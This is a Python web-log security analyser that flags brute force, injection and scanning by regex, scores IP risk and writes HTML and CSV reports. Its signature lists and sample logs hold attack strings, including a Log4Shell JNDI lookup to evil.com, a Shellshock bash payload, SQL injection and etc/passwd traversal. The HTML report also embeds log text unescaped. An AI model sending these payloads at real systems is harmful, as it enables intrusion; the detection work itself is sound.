#!/usr/bin/env python3
"""
Advanced Security Log Analyser
Detects brute force attacks, SQL injection, XSS, directory traversal,
port scanning, malicious user agents, and more from web server logs.
Generates HTML and CSV reports with geolocation of suspicious IPs.
Author: [Jahid]
"""

import re
import os
import csv
import datetime
import requests
from collections import Counter, defaultdict

# -- Colours ------------------------------------------------------------------
class C:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    CYAN   = '\033[96m'
    BOLD   = '\033[1m'
    END    = '\033[0m'

# -- Attack signatures --------------------------------------------------------
ATTACK_PATTERNS = {
    "SQL Injection": [
        r"(union\s+select|select\s+\*|drop\s+table|insert\s+into|delete\s+from)",
        r"(or\s+1=1|and\s+1=1|'\s+or\s+'|--\s*$|;--)",
        r"(exec\s*\(|xp_cmdshell|sp_executesql)",
        r"(benchmark\s*\(|sleep\s*\(|waitfor\s+delay)",
    ],
    "XSS Attack": [
        r"(<script|</script>|javascript:|onerror=|onload=)",
        r"(alert\s*\(|document\.cookie|document\.write)",
        r"(<iframe|<img\s+src=|<svg\s+on)",
    ],
    "Directory Traversal": [
        r"(\.\./|\.\.\\|%2e%2e%2f|%252e%252e)",
        r"(etc/passwd|etc/shadow|win\.ini|system32)",
        r"(/proc/self|/var/log|/usr/local/etc)",
    ],
    "Command Injection": [
        r"(;ls|;cat|;whoami|;id|;uname|;pwd)",
        r"(\|\s*ls|\|\s*cat|\|\s*whoami)",
        r"(`ls`|`cat\s|`whoami`|`id`)",
        r"(\$\(ls\)|\$\(cat|\$\(whoami\))",
    ],
    "Log4Shell": [
        r"(\$\{jndi:|jndi:ldap://|jndi:rmi://|jndi:dns://)",
        r"(\$\{lower:|%24%7bjndi)",
    ],
    "Shellshock": [
        r"(\(\)\s*\{\s*:;\s*\};)",
    ],
    "Path Scanning": [
        r"(\.git/|\.env|\.htaccess|\.htpasswd|web\.config)",
        r"(wp-admin|wp-login|phpMyAdmin|phpmyadmin|adminer)",
        r"(\.php\.bak|\.sql|backup\.zip|dump\.sql)",
    ],
    "Brute Force Indicator": [
        r"(POST\s+/login|POST\s+/admin|POST\s+/wp-login)",
        r"(POST\s+/signin|POST\s+/auth|POST\s+/session)",
    ],
}

# -- Malicious user agents ----------------------------------------------------
MALICIOUS_AGENTS = {
    "sqlmap":          "SQL injection scanner",
    "nikto":           "Web vulnerability scanner",
    "nmap":            "Network scanner",
    "masscan":         "Port scanner",
    "nessus":          "Vulnerability scanner",
    "acunetix":        "Web vulnerability scanner",
    "burpsuite":       "Web security testing",
    "metasploit":      "Exploitation framework",
    "dirbuster":       "Directory brute-forcer",
    "gobuster":        "Directory brute-forcer",
    "hydra":           "Password cracker",
    "zgrab":           "Banner grabber",
    "python-requests": "Automated scripting",
    "go-http-client":  "Automated scripting",
}

# -- Sample logs --------------------------------------------------------------
SAMPLE_LOGS = """185.220.101.45 - - [23/Apr/2026:08:01:01 +0000] "GET /index.html" 200 1234 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:05 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:06 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:07 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:08 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:09 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:10 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
185.220.101.45 - - [23/Apr/2026:08:01:11 +0000] "POST /login" 401 512 "-" "Mozilla/5.0"
192.168.1.10 - - [23/Apr/2026:08:02:01 +0000] "GET /dashboard" 200 4321 "-" "Mozilla/5.0 Chrome/120"
10.0.0.99 - - [23/Apr/2026:08:03:01 +0000] "GET /admin" 403 215 "-" "Mozilla/5.0"
10.0.0.99 - - [23/Apr/2026:08:03:02 +0000] "GET /admin/config" 403 215 "-" "Mozilla/5.0"
10.0.0.99 - - [23/Apr/2026:08:03:03 +0000] "GET /.env" 404 0 "-" "Mozilla/5.0"
10.0.0.99 - - [23/Apr/2026:08:03:04 +0000] "GET /.git/config" 404 0 "-" "Mozilla/5.0"
10.0.0.99 - - [23/Apr/2026:08:03:05 +0000] "GET /wp-admin" 404 0 "-" "Mozilla/5.0"
45.33.32.156 - - [23/Apr/2026:08:04:01 +0000] "GET /index.php?id=1 UNION SELECT 1,2,3--" 400 0 "-" "sqlmap/1.7"
45.33.32.156 - - [23/Apr/2026:08:04:02 +0000] "GET /search?q=<script>alert(1)</script>" 400 0 "-" "sqlmap/1.7"
45.33.32.156 - - [23/Apr/2026:08:04:03 +0000] "GET /page?file=../../etc/passwd" 400 0 "-" "sqlmap/1.7"
45.33.32.156 - - [23/Apr/2026:08:04:04 +0000] "GET /cmd?exec=;whoami" 400 0 "-" "sqlmap/1.7"
172.16.0.5 - - [23/Apr/2026:08:05:01 +0000] "GET /products" 200 8765 "-" "Mozilla/5.0 Firefox/115"
172.16.0.5 - - [23/Apr/2026:08:05:10 +0000] "GET /about" 200 3456 "-" "Mozilla/5.0 Firefox/115"
203.0.113.99 - - [23/Apr/2026:08:06:01 +0000] "GET /${jndi:ldap://evil.com/x}" 400 0 "-" "Mozilla/5.0"
203.0.113.99 - - [23/Apr/2026:08:06:02 +0000] "GET /vuln" 200 0 "-" "() { :; }; /bin/bash -i"
198.51.100.77 - - [23/Apr/2026:08:07:01 +0000] "GET /index.html" 200 1234 "-" "nikto/2.1.6"
198.51.100.77 - - [23/Apr/2026:08:07:02 +0000] "GET /admin" 403 0 "-" "nikto/2.1.6"
198.51.100.77 - - [23/Apr/2026:08:07:03 +0000] "GET /backup.zip" 404 0 "-" "nikto/2.1.6"
198.51.100.77 - - [23/Apr/2026:08:07:04 +0000] "GET /dump.sql" 404 0 "-" "nikto/2.1.6"
192.168.1.20 - - [23/Apr/2026:08:08:01 +0000] "GET /api/users" 200 2345 "-" "Mozilla/5.0 Safari/605"
192.168.1.20 - - [23/Apr/2026:08:08:10 +0000] "GET /api/orders" 200 5678 "-" "Mozilla/5.0 Safari/605"
"""

# -- Log parser ---------------------------------------------------------------
def parse_log_line(line):
    pattern = r'(\S+)\s+\S+\s+\S+\s+\[(.+?)\]\s+"(.+?)"\s+(\d+)\s+(\S+)(?:\s+"(.+?)")?(?:\s+"(.+?)")?'
    match = re.match(pattern, line)
    if match:
        method_path = match.group(3)
        parts = method_path.split(" ", 1)
        return {
            "ip":         match.group(1),
            "time":       match.group(2),
            "method":     parts[0] if len(parts) > 1 else "UNKNOWN",
            "path":       parts[1] if len(parts) > 1 else parts[0],
            "status":     int(match.group(4)),
            "size":       match.group(5),
            "user_agent": match.group(7) or "-",
            "raw":        line.strip(),
        }
    return None

# -- Attack detector ----------------------------------------------------------
def detect_attacks(entry):
    attacks_found = []
    text = f"{entry['path']} {entry['user_agent']} {entry['raw']}".lower()
    for attack_type, patterns in ATTACK_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                attacks_found.append(attack_type)
                break
    return list(set(attacks_found))

def detect_malicious_agent(user_agent):
    ua_lower = user_agent.lower()
    for agent, desc in MALICIOUS_AGENTS.items():
        if agent.lower() in ua_lower:
            return agent, desc
    return None, None

# -- Geolocation --------------------------------------------------------------
geo_cache = {}

def geolocate_ip(ip):
    if ip in geo_cache:
        return geo_cache[ip]
    if (ip.startswith("192.168") or ip.startswith("10.")
            or ip.startswith("172.") or ip == "127.0.0.1"):
        geo_cache[ip] = "Local Network"
        return "Local Network"
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=country,city,isp,proxy,hosting",
            timeout=3
        )
        if r.status_code == 200:
            d = r.json()
            geo = f"{d.get('city','?')}, {d.get('country','?')}"
            if d.get("proxy") or d.get("hosting"):
                geo += " [VPN/PROXY]"
            geo_cache[ip] = geo
            return geo
    except:
        pass
    geo_cache[ip] = "Unknown"
    return "Unknown"

# -- Risk scorer --------------------------------------------------------------
def calculate_risk_score(ip_data):
    score = 0
    score += min(ip_data["failed_logins"] * 2, 30)
    score += min(len(ip_data["attacks"]) * 10, 40)
    score += min(ip_data["forbidden_count"] * 3, 15)
    score += min(ip_data["scan_indicators"] * 5, 15)
    if ip_data["malicious_agent"]:
        score += 20
    return min(score, 100)

def risk_label(score):
    if score >= 75:
        return f"{C.RED}{C.BOLD}CRITICAL ({score}/100){C.END}", "CRITICAL"
    elif score >= 50:
        return f"{C.RED}HIGH ({score}/100){C.END}", "HIGH"
    elif score >= 25:
        return f"{C.YELLOW}MEDIUM ({score}/100){C.END}", "MEDIUM"
    else:
        return f"{C.GREEN}LOW ({score}/100){C.END}", "LOW"

# -- HTML report --------------------------------------------------------------
def generate_html_report(summary, ip_profiles, timestamp):
    os.makedirs("log_reports", exist_ok=True)
    filename = f"log_reports/security_report_{timestamp}.html"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Security Log Analysis Report</title>
<style>
  body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }}
  h1 {{ color: #58a6ff; border-bottom: 2px solid #21262d; padding-bottom: 10px; }}
  h2 {{ color: #79c0ff; margin-top: 30px; }}
  .grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }}
  .box {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; text-align: center; }}
  .box .num {{ font-size: 2em; font-weight: bold; color: #58a6ff; }}
  .box .lbl {{ font-size: 0.85em; color: #8b949e; margin-top: 5px; }}
  table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
  th {{ background: #21262d; color: #79c0ff; padding: 10px; text-align: left; border: 1px solid #30363d; }}
  td {{ padding: 8px 10px; border: 1px solid #21262d; font-size: 0.9em; }}
  tr:nth-child(even) {{ background: #161b22; }}
  tr:hover {{ background: #1c2128; }}
  .badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }}
  .red {{ background: #3d1c1c; color: #ff7b72; border: 1px solid #ff7b72; }}
  .orange {{ background: #2d1a0e; color: #f0883e; border: 1px solid #f0883e; }}
  .yellow {{ background: #2d2008; color: #d29922; border: 1px solid #d29922; }}
  .green {{ background: #0d2818; color: #3fb950; border: 1px solid #3fb950; }}
  .footer {{ margin-top: 40px; color: #8b949e; font-size: 0.85em; border-top: 1px solid #21262d; padding-top: 15px; }}
</style>
</head>
<body>
<h1>Security Log Analysis Report</h1>
<p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Advanced Security Log Analyser</p>

<h2>Summary</h2>
<div class="grid">
  <div class="box"><div class="num">{summary['total_requests']}</div><div class="lbl">Total Requests</div></div>
  <div class="box"><div class="num" style="color:#ff7b72">{summary['total_attacks']}</div><div class="lbl">Attacks Detected</div></div>
  <div class="box"><div class="num" style="color:#f0883e">{summary['unique_ips']}</div><div class="lbl">Unique IPs</div></div>
  <div class="box"><div class="num" style="color:#d29922">{summary['failed_logins']}</div><div class="lbl">Failed Logins</div></div>
  <div class="box"><div class="num" style="color:#ff7b72">{summary['critical_ips']}</div><div class="lbl">Critical Risk IPs</div></div>
  <div class="box"><div class="num">{summary['malicious_agents']}</div><div class="lbl">Malicious Agents</div></div>
</div>

<h2>IP Risk Profiles</h2>
<table>
  <tr><th>IP Address</th><th>Location</th><th>Requests</th><th>Failed Logins</th><th>Attack Types</th><th>Agent</th><th>Risk</th></tr>"""

    for ip, d in sorted(ip_profiles.items(), key=lambda x: x[1]["risk_score"], reverse=True):
        score = d["risk_score"]
        badge = "red" if score >= 75 else "orange" if score >= 50 else "yellow" if score >= 25 else "green"
        risk_text = "CRITICAL" if score >= 75 else "HIGH" if score >= 50 else "MEDIUM" if score >= 25 else "LOW"
        attacks_html = ", ".join(d["attacks"]) if d["attacks"] else "-"
        agent_html = f'<span class="badge red">{d["malicious_agent"]}</span>' if d["malicious_agent"] else "-"
        html += f"""
  <tr>
    <td><code>{ip}</code></td>
    <td>{d['geo']}</td>
    <td>{d['total_requests']}</td>
    <td>{d['failed_logins']}</td>
    <td>{attacks_html}</td>
    <td>{agent_html}</td>
    <td><span class="badge {badge}">{risk_text} ({score}/100)</span></td>
  </tr>"""

    html += """
</table>

<h2>Attack Type Breakdown</h2>
<table>
  <tr><th>Attack Type</th><th>Count</th><th>Severity</th></tr>"""

    for attack, count in sorted(summary["attack_types"].items(), key=lambda x: x[1], reverse=True):
        sev   = "CRITICAL" if attack in ["SQL Injection", "Command Injection", "Log4Shell", "Shellshock"] else "HIGH" if attack in ["XSS Attack", "Directory Traversal"] else "MEDIUM"
        badge = "red" if sev == "CRITICAL" else "orange" if sev == "HIGH" else "yellow"
        html += f'<tr><td>{attack}</td><td>{count}</td><td><span class="badge {badge}">{sev}</span></td></tr>'

    html += """
</table>

<h2>HTTP Status Code Breakdown</h2>
<table>
  <tr><th>Status Code</th><th>Description</th><th>Count</th></tr>"""

    status_desc = {200: "OK", 301: "Redirect", 302: "Redirect", 400: "Bad Request",
                   401: "Unauthorised", 403: "Forbidden", 404: "Not Found", 500: "Server Error"}
    for code, count in sorted(summary["status_codes"].items()):
        desc = status_desc.get(code, "Other")
        html += f"<tr><td>{code}</td><td>{desc}</td><td>{count}</td></tr>"

    html += f"""
</table>

<div class="footer">
  <p>Generated by Advanced Security Log Analyser</p>
</div>
</body>
</html>"""

    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
    return filename

# -- CSV report ---------------------------------------------------------------
def save_csv_report(ip_profiles, timestamp):
    os.makedirs("log_reports", exist_ok=True)
    filename = f"log_reports/security_report_{timestamp}.csv"
    with open(filename, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["IP", "Location", "Total Requests", "Failed Logins",
                         "Forbidden", "Attacks", "Malicious Agent", "Risk Score", "Risk Level"])
        for ip, d in sorted(ip_profiles.items(), key=lambda x: x[1]["risk_score"], reverse=True):
            _, level = risk_label(d["risk_score"])
            writer.writerow([
                ip, d["geo"], d["total_requests"], d["failed_logins"],
                d["forbidden_count"], "; ".join(d["attacks"]),
                d["malicious_agent"] or "-", d["risk_score"], level
            ])
    return filename

# -- Main analyser ------------------------------------------------------------
def analyse(log_text):
    lines   = [l.strip() for l in log_text.strip().split("\n") if l.strip()]
    entries = []
    for line in lines:
        parsed = parse_log_line(line)
        if parsed:
            entries.append(parsed)

    print(f"\n  Parsed {len(entries)} log entries from {len(lines)} lines\n")

    ip_profiles = defaultdict(lambda: {
        "total_requests":  0,
        "failed_logins":   0,
        "forbidden_count": 0,
        "scan_indicators": 0,
        "attacks":         set(),
        "malicious_agent": None,
        "geo":             "",
        "risk_score":      0,
    })

    status_counter = Counter()
    attack_counter = Counter()
    malicious_count = 0

    for entry in entries:
        ip   = entry["ip"]
        prof = ip_profiles[ip]
        prof["total_requests"] += 1
        status_counter[entry["status"]] += 1

        if entry["status"] == 401:
            prof["failed_logins"] += 1
        if entry["status"] == 403:
            prof["forbidden_count"] += 1

        attacks = detect_attacks(entry)
        for a in attacks:
            prof["attacks"].add(a)
            attack_counter[a] += 1

        if entry["status"] == 404 and prof["total_requests"] > 3:
            prof["scan_indicators"] += 1

        agent, _ = detect_malicious_agent(entry["user_agent"])
        if agent and not prof["malicious_agent"]:
            prof["malicious_agent"] = agent
            malicious_count += 1

    unique_ips = list(ip_profiles.keys())
    print(f"  Geolocating {len(unique_ips)} unique IPs...")
    for ip in unique_ips:
        ip_profiles[ip]["geo"] = geolocate_ip(ip)

    for ip in unique_ips:
        ip_profiles[ip]["attacks"]    = list(ip_profiles[ip]["attacks"])
        ip_profiles[ip]["risk_score"] = calculate_risk_score(ip_profiles[ip])

    total_attacks = sum(len(d["attacks"]) > 0 for d in ip_profiles.values())
    critical_ips  = sum(1 for d in ip_profiles.values() if d["risk_score"] >= 75)
    total_failed  = sum(d["failed_logins"] for d in ip_profiles.values())

    summary = {
        "total_requests":  len(entries),
        "unique_ips":      len(unique_ips),
        "total_attacks":   total_attacks,
        "failed_logins":   total_failed,
        "critical_ips":    critical_ips,
        "malicious_agents": malicious_count,
        "status_codes":    dict(status_counter),
        "attack_types":    dict(attack_counter),
    }

    # Terminal output
    print(f"\n{'='*70}")
    print(f"{C.BOLD}  SECURITY LOG ANALYSIS REPORT{C.END}")
    print(f"  {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*70}\n")
    print(f"  Total Requests   : {C.CYAN}{len(entries)}{C.END}")
    print(f"  Unique IPs       : {C.CYAN}{len(unique_ips)}{C.END}")
    print(f"  Attacks Detected : {C.RED}{total_attacks} IPs with attack signatures{C.END}")
    print(f"  Failed Logins    : {C.YELLOW}{total_failed}{C.END}")
    print(f"  Critical Risk IPs: {C.RED}{critical_ips}{C.END}")
    print(f"  Malicious Agents : {C.RED}{malicious_count}{C.END}")

    print(f"\n{C.BOLD}  IP RISK PROFILES{C.END}")
    print(f"{'─'*70}")
    print(f"  {'IP':<18} {'LOCATION':<28} {'REQ':<5} {'FAIL':<5} {'ATTACKS':<25} RISK")
    print(f"  {'─'*18} {'─'*28} {'─'*5} {'─'*5} {'─'*25} {'─'*20}")

    for ip, d in sorted(ip_profiles.items(), key=lambda x: x[1]["risk_score"], reverse=True):
        risk_str, _ = risk_label(d["risk_score"])
        attacks_str = ", ".join(d["attacks"])[:24] if d["attacks"] else "None"
        agent_str   = f" [{d['malicious_agent']}]" if d["malicious_agent"] else ""
        geo         = (d["geo"] or "Unknown")[:27]
        print(f"  {ip:<18} {geo:<28} {d['total_requests']:<5} {d['failed_logins']:<5} {attacks_str:<25} {risk_str}{agent_str}")

    print(f"\n{C.BOLD}  ATTACK TYPE BREAKDOWN{C.END}")
    print(f"{'─'*70}")
    if attack_counter:
        for attack, count in sorted(attack_counter.items(), key=lambda x: x[1], reverse=True):
            bar = "X" * min(count * 3, 30)
            print(f"  {attack:<25} {C.RED}{bar}{C.END} {count}")
    else:
        print(f"  {C.GREEN}No attack signatures detected{C.END}")

    print(f"\n{C.BOLD}  HTTP STATUS BREAKDOWN{C.END}")
    print(f"{'─'*70}")
    status_desc = {200: "OK", 301: "Redirect", 302: "Redirect", 400: "Bad Request",
                   401: "Unauthorised", 403: "Forbidden", 404: "Not Found", 500: "Server Error"}
    for code, count in sorted(status_counter.items()):
        desc   = status_desc.get(code, "Other")
        colour = C.GREEN if code == 200 else C.RED if code >= 400 else C.YELLOW
        print(f"  {colour}{code} {desc:<18}{C.END} {count} requests")

    brute_force = [(ip, d) for ip, d in ip_profiles.items() if d["failed_logins"] >= 5]
    if brute_force:
        print(f"\n{C.RED}{C.BOLD}  WARNING: BRUTE FORCE DETECTED{C.END}")
        print(f"{'─'*70}")
        for ip, d in brute_force:
            print(f"  {C.RED}{ip} -- {d['failed_logins']} failed login attempts -- {d['geo']}{C.END}")

    timestamp   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    html_report = generate_html_report(summary, ip_profiles, timestamp)
    csv_report  = save_csv_report(ip_profiles, timestamp)

    print(f"\n{'='*70}")
    print(f"  HTML Report : {C.CYAN}{html_report}{C.END}")
    print(f"  CSV Report  : {C.CYAN}{csv_report}{C.END}")
    print(f"{'='*70}\n")


# -- Entry point --------------------------------------------------------------
print(f"\n{'='*70}")
print(f"{C.BOLD}  ADVANCED SECURITY LOG ANALYSER{C.END}")
print(f"{'='*70}\n")
print("  [1] Use built-in sample logs (recommended for testing)")
print("  [2] Load from a log file\n")

try:
    choice = input("  Select (1/2): ").strip()
    if choice == "2":
        path = input("  Enter full path to log file: ").strip()
        if os.path.exists(path):
            with open(path, "r", errors="ignore", encoding="utf-8") as f:
                log_data = f.read()
            print(f"\n  Loaded {len(log_data.splitlines())} lines from {path}")
        else:
            print(f"  {C.YELLOW}File not found. Using sample logs instead.{C.END}")
            log_data = SAMPLE_LOGS
    else:
        log_data = SAMPLE_LOGS

    analyse(log_data)

except KeyboardInterrupt:
    print(f"\n\n  {C.YELLOW}Exited.{C.END}\n")